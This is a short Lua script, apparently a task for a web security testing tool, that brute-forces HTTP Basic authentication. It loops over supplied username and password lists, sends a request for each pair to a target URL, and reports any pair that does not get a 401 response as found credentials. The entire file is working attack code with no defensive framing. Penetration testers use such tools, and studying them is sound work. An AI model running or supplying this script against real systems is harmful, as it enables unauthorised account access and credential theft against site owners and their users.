 require "SelHTTP"
 task.caption = 'HTTP Brute Force'
 userlist = ctk.file.getcontents(params.userlistfile)
 passlist = ctk.file.getcontents(params.passlistfile)
 url = params.url
 method = params.method
 found = false
 
 http = sel_httprequest:new()
 http.auth = 'Basic'
 http.description = 'Auth Force Request'
 u = ctk.string.loop:new()
 u:load(userlist)
 p = ctk.string.loop:new()
 p:load(passlist)
 print('Executing HTTP brute force...')
 print('Target URL: '..url..'...')
 while u:parsing() do
  task:setprogress(u.curindex,u.count)
  http.username = u.current
  p:reset()
  while p:parsing() do
   http.password = p.current
   http:open(method,url)
   if http.status ~= 401 then
    task:logrequest(http.requestinfo)
    msg = 'Found: '..u.current..':'..p.current
    found = true
    printsuccess(msg)
    p:stop()
   end
  end
 end
 u:release()
 p:release()
 http:release() 
 
 task.status = 'Done.'
 if found == false then
  printfailure('No passwords found.')
 end
 print(task.status)